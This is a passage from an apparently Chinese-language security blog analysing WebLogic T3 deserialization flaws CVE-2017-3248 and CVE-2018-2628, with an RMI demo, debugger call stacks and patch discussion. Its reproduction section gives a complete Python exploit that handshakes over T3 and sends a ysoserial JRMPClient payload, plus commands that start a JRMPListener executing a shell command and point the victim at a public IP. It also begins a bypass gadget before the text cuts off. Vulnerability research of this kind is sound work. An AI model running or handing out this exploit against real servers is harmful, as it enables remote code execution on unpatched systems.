java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">IRemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">Remote</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RemoteHelloWorld</span> <span class="keyword">extends</span> <span class="title class_">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title class_">IRemoteHelloWorld</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">protected</span> <span class="title function_">RemoteHelloWorld</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            <span class="built_in">super</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">hello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;call hello()&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;helloworld&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">start</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">RemoteHelloWorld</span> <span class="variable">h</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">RemoteHelloWorld</span>();</span><br><span class="line">        LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        Naming.rebind(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>, h);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">RMIServer</span>().start();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Client:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.Train;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.test.rmi.RMIServer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RMIClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        RMIServer.<span class="type">IRemoteHelloWorld</span> <span class="variable">hello</span> <span class="operator">=</span> (RMIServer.IRemoteHelloWorld)</span><br><span class="line">            Naming.lookup(<span class="string">&quot;rmi://127.0.0.1:1099/Hello&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">res</span> <span class="operator">=</span> hello.hello();</span><br><span class="line">        System.out.println(res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>客户端调用一下就会输出hello，这就是简单的RMI</p>
<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>还是那套调试法，应万变<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681285175174-0af0a7ce-48d8-403e-b357-ca0615609bba.png#averageHue=%232d2d2a&clientId=u144bde1e-439a-4&from=paste&height=458&id=ue0d96a3c&originHeight=573&originWidth=1679&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1353910&status=done&style=none&taskId=u787b0889-ff57-4641-9fa7-deb940bb9eb&title=&width=1343.2" alt="image.png"><br>断点还是给在最初的起点，也就是T3反序列化的那个地方，随之我们运行POC，等待响应，哟来了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681285509922-e39adc64-7e7b-4df6-9cb8-088a5643b2f5.png#averageHue=%23292b28&clientId=u144bde1e-439a-4&from=paste&height=569&id=u8f0e900f&originHeight=711&originWidth=1348&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1350080&status=done&style=none&taskId=u2ae927be-bd7c-4a26-886a-5e17210c6b5&title=&width=1078.4" alt="image.png"><br>老地方，随后就是裸的触发CC6，先进入Hashmap<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681285680816-f0bbba9e-8225-40c8-a958-fe993ab8511c.png#averageHue=%232b2d2a&clientId=u144bde1e-439a-4&from=paste&height=648&id=u2121d805&originHeight=810&originWidth=1781&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=2027857&status=done&style=none&taskId=u0767caa8-802f-4868-b076-a0f077bc05f&title=&width=1424.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681285684522-daa6c8b6-dc93-4044-9a48-15adeb7d0adb.png#averageHue=%23282a27&clientId=u144bde1e-439a-4&from=paste&height=555&id=u35240763&originHeight=694&originWidth=1394&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1320312&status=done&style=none&taskId=ucf6cea6b-99e4-45dd-9719-9bc484f18a6&title=&width=1115.2" alt="image.png"><br>然后这一套打完了，就会进入Chaintransfomer方法去链式调用方法，接着就会加载到我们的恶意远程类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681285717091-0b8a2160-4bfa-45f8-90d6-0242783f96cb.png#averageHue=%232f312c&clientId=u144bde1e-439a-4&from=paste&height=168&id=uf2423dd9&originHeight=210&originWidth=1151&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=344146&status=done&style=none&taskId=u3c986538-55d5-452e-9187-80075da7765&title=&width=920.8" alt="image.png"><br>首先实例化一下Context,然后后续就是一系列的实例化过程，结束过后就进入远程调用环节<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681286843597-024dccfe-ac99-42cc-b387-4e1a4568b7e2.png#averageHue=%232b2d2a&clientId=u144bde1e-439a-4&from=paste&height=582&id=u1675e7b8&originHeight=728&originWidth=1853&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1906575&status=done&style=none&taskId=u8612da84-1768-42d6-a4f2-2d797219ed9&title=&width=1482.4" alt="image.png"><br>在服务端执行命令，最后返回结果给客户端了<br>调用栈如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">getServerLocation:42, RemoteImpl (com.boogipop.payload)</span><br><span class="line">invoke:-1, RemoteImpl_WLSkel (com.boogipop.payload)</span><br><span class="line">invoke:667, BasicServerRef (weblogic.rmi.internal)</span><br><span class="line">run:522, BasicServerRef$1 (weblogic.rmi.internal)</span><br><span class="line">doAs:363, AuthenticatedSubject (weblogic.security.acl.internal)</span><br><span class="line">runAs:146, SecurityManager (weblogic.security.service)</span><br><span class="line">handleRequest:518, BasicServerRef (weblogic.rmi.internal)</span><br><span class="line">run:118, WLSExecuteRequest (weblogic.rmi.internal.wls)</span><br><span class="line">execute:256, ExecuteThread (weblogic.work)</span><br><span class="line">run:221, ExecuteThread (weblogic.work)</span><br></pre></td></tr></table></figure>
<p>这里把流程机制的简化了，为了方便理解，其实我都是一步步跟到挺深的地方</p>
<h1 id="CVE-2017-3248"><a href="#CVE-2017-3248" class="headerlink" title="CVE-2017-3248"></a>CVE-2017-3248</h1><h2 id="环境-3"><a href="#环境-3" class="headerlink" title="环境"></a>环境</h2><p>Weblogic1036、JDK8U202</p>
<h2 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><p>该漏洞其实和上个分P里讲到的RMI差不多，这个CVE可以对标TCTF-3rm1了，其中的RemoteObjectInvocationHandler就出自这个漏洞，算是闭环了，学了这么多<br>这个洞是利用反序列化让Weblogic请求我们恶意的服务端，我们监听一波就好</p>
<h2 id="漏洞复现-2"><a href="#漏洞复现-2" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>将ysoserial复制到exp那个目录里，运行即可<br><code>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections6 &#39;touch /tmp/success&#39;</code><br>上面的payload需要靶机可以访问到，因此最好放在公网<br>随之用py2运行exp.py<br><code>C:\Python27\python.exe exp.py 127.0.0.1 7001 ./ysoserial.jar 114.116.119.253 8888 JRMPClient</code><br>exp内容如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    <span class="comment">#generates ysoserial payload</span></span><br><span class="line">    command = <span class="string">&#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;</span>.<span class="built_in">format</span>(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;command: &quot;</span> + command)</span><br><span class="line">    os.system(command)</span><br><span class="line">    bin_file = <span class="built_in">open</span>(<span class="string">&#x27;payload.out&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">    <span class="keyword">return</span> binascii.hexlify(bin_file)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">t3_handshake</span>(<span class="params">sock, server_addr</span>):</span><br><span class="line">    sock.connect(server_addr)</span><br><span class="line">    sock.send(<span class="string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    sock.recv(<span class="number">1024</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;handshake successful&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_t3_request_object</span>(<span class="params">sock, port</span>):</span><br><span class="line">    data1 = <span class="string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span></span><br><span class="line">    data2 = <span class="string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="built_in">format</span>(dport))</span><br><span class="line">    data3 = <span class="string">&#x27;1a7727000d3234322e323134&#x27;</span></span><br><span class="line">    data4 = <span class="string">&#x27;2e312e32353461863d1d0000000078&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> [data1,data2,data3,data4]:</span><br><span class="line">        sock.send(d.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;send request payload successful,recv length:%d&#x27;</span>%(<span class="built_in">len</span>(sock.recv(<span class="number">2048</span>))))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_payload_objdata</span>(<span class="params">sock, data</span>):</span><br><span class="line">    payload=<span class="string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span></span><br><span class="line">    payload+=data</span><br><span class="line">    payload+=<span class="string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span></span><br><span class="line">    payload = <span class="string">&#x27;%s%s&#x27;</span>%(<span class="string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(payload)/<span class="number">2</span> + <span class="number">4</span>),payload)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    sock.send(payload.decode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            res += sock.recv(<span class="number">4096</span>)</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):</span><br><span class="line">    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    sock.settimeout(<span class="number">65</span>)</span><br><span class="line">    server_addr = (dip, dport)</span><br><span class="line">    t3_handshake(sock, server_addr)</span><br><span class="line">    build_t3_request_object(sock, dport)</span><br><span class="line">    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload: &quot;</span> + payload)</span><br><span class="line">    rs=send_payload_objdata(sock, payload)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;response: &#x27;</span> + rs)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;exploit completed!&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment">#check for args, print usage if incorrect</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">7</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span></span><br><span class="line">              <span class="string">&#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;</span>)</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line">    dip = sys.argv[<span class="number">1</span>]</span><br><span class="line">    dport = <span class="built_in">int</span>(sys.argv[<span class="number">2</span>])</span><br><span class="line">    path_ysoserial = sys.argv[<span class="number">3</span>]</span><br><span class="line">    jrmp_listener_ip = sys.argv[<span class="number">4</span>]</span><br><span class="line">    jrmp_listener_port = sys.argv[<span class="number">5</span>]</span><br><span class="line">    jrmp_client = sys.argv[<span class="number">6</span>]</span><br><span class="line">    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)</span><br><span class="line">            </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681291163516-c7a25440-d71d-4e71-ac69-20538a9975fc.png#averageHue=%233b3a2f&clientId=u38618e2d-fa8a-4&from=paste&height=206&id=u23016419&originHeight=258&originWidth=1465&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=487740&status=done&style=none&taskId=uea64aa4c-5453-4409-9ab7-a753f8ae5ce&title=&width=1172" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681291169143-1d394719-1549-4724-bd18-34abb5693df2.png#averageHue=%230a0807&clientId=u38618e2d-fa8a-4&from=paste&height=351&id=ue9d633a6&originHeight=439&originWidth=1173&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=45207&status=done&style=none&taskId=u66808452-93a4-492c-83b1-9aeec67a126&title=&width=938.4" alt="image.png"><br>最后可以发现创建文件成功<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681291179053-5709beb2-dc39-47ab-b1f5-d24a3f892d83.png#averageHue=%23fefdfc&clientId=u38618e2d-fa8a-4&from=paste&height=66&id=u30c8eacd&originHeight=83&originWidth=1017&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=7370&status=done&style=none&taskId=uc4478b4d-32bc-49e5-bc92-a5c14615e7e&title=&width=813.6" alt="image.png"></p>
<h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><p>起手式还是那样，毕竟反序列化入口就在那里，这里其实可以看看这篇文章<br><a target="_blank" rel="noopener" href="https://www.yuque.com/boogipop/iwyn7t/fvlzexbnf80fxep1?view=doc_embed">以TCTF2022-3rm1 拓展开的学习</a><br>我估计这一题就是根据这个CVE改的，太明显拉！套中套！</p>
<blockquote>
<ul>
<li><input checked="" disabled="" type="checkbox"> 4.11 累了，昨天出了一天的题，今天我想总结一下然后打个Htb结束</li>
</ul>
</blockquote>
<p>好了继续来分析，首先remoteinvocationhandler本身没有readObject方法，可是它父类有，所以进入了父类<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681349738520-7a55aa85-57f3-42d9-af93-1c6cebc0e8c6.png#averageHue=%232a2c2a&clientId=u76674c50-f3b5-4&from=paste&height=418&id=u19ec48f9&originHeight=523&originWidth=1786&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1321597&status=done&style=none&taskId=u68347cfb-c43f-4b1d-b1c9-fb05e9a0814&title=&width=1428.8" alt="image.png"><code>ref.readExternal</code>方法，下面的变量是构造的恶意Unicastref，跟进<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681349835675-47cde59d-8ecd-4c0f-bc67-2d0b7282dd29.png#averageHue=%232a2c2a&clientId=u76674c50-f3b5-4&from=paste&height=586&id=uccff6e2a&originHeight=732&originWidth=1428&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1433401&status=done&style=none&taskId=ua5ab4feb-44dc-40dc-ad20-6f62a632f17&title=&width=1142.4" alt="image.png"><br>就进入read方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681350141049-98820aa8-ffbc-4413-96b1-692a0b56bba2.png#averageHue=%232b2d2b&clientId=u76674c50-f3b5-4&from=paste&height=627&id=u67fe4786&originHeight=784&originWidth=1347&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1470907&status=done&style=none&taskId=u6c0922fe-1b63-418a-aedc-fa5b0e78794&title=&width=1077.6" alt="image.png"><br>接下来就是一些列的嵌套，这个在RMI里面讲过，然后就是对我们恶意服务端发请求了<br>利用java.rmi.registry.Registry，序列化RemoteObjectInvocationHandler，并使用UnicastRef和远端建立tcp连接，获取RMI registry，序列化之后发送给weblogic，weblogic会请求我们的JRMPListener，然后将获取的内容利用readObject()进行解析，导致恶意代码执行</p>
<h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> Class&lt;?&gt; resolveProxyClass(String[] interfaces) <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">    String[] arr$ = interfaces;</span><br><span class="line">    <span class="type">int</span> <span class="variable">len$</span> <span class="operator">=</span> interfaces.length;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i$</span> <span class="operator">=</span> <span class="number">0</span>; i$ &lt; len$; ++i$) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">intf</span> <span class="operator">=</span> arr$[i$];</span><br><span class="line">        <span class="keyword">if</span> (intf.equals(<span class="string">&quot;java.rmi.registry.Registry&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Unauthorized proxy deserialization&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">super</span>.resolveProxyClass(interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看上面的补丁，补丁都是搭载resolveclass这里，治标不治本，黑名单罢了，就是ban掉了那个Registry，那我们不进入代理的Resolveclass就好了。</p>
<h1 id="CVE-2018-2628（绕过1）"><a href="#CVE-2018-2628（绕过1）" class="headerlink" title="CVE-2018-2628（绕过1）"></a>CVE-2018-2628（绕过1）</h1><p>直接反序列化UnicastRef.<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681352237077-3bcdd0ae-caba-4fa7-adba-97da58678a88.png#averageHue=%232b2b27&clientId=u088e092b-4ad6-4&from=paste&height=123&id=u080ca6eb&originHeight=154&originWidth=1156&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=245395&status=done&style=none&taskId=uf8cd0471-5a89-41fb-8ee3-c46434ac3f7&title=&width=924.8" alt="image.png"><br>人家有自己的readExternal，也会触发</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Registry <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    String host;</span><br><span class="line">    <span class="type">int</span> port;</span><br><span class="line">    <span class="type">int</span> <span class="variable">sep</span> <span class="operator">=</span> command.indexOf(<span class="string">&#x27;:&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (sep &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        port = <span class="keyword">new</span> <span class="title class_">Random</span>().nextInt(<span class="number">65535</span>);</span><br><span class="line">        host = command;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        host = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        port = Integer.valueOf(command.substring(sep + <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ObjID</span> <span class="variable">id</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjID</span>(<span class="keyword">new</span> <span class="title class_">Random</span>().nextInt()); <span class="comment">// RMI registry</span></span><br><span class="line">    <span class="type">TCPEndpoint</span> <span class="variable">te</span> <span 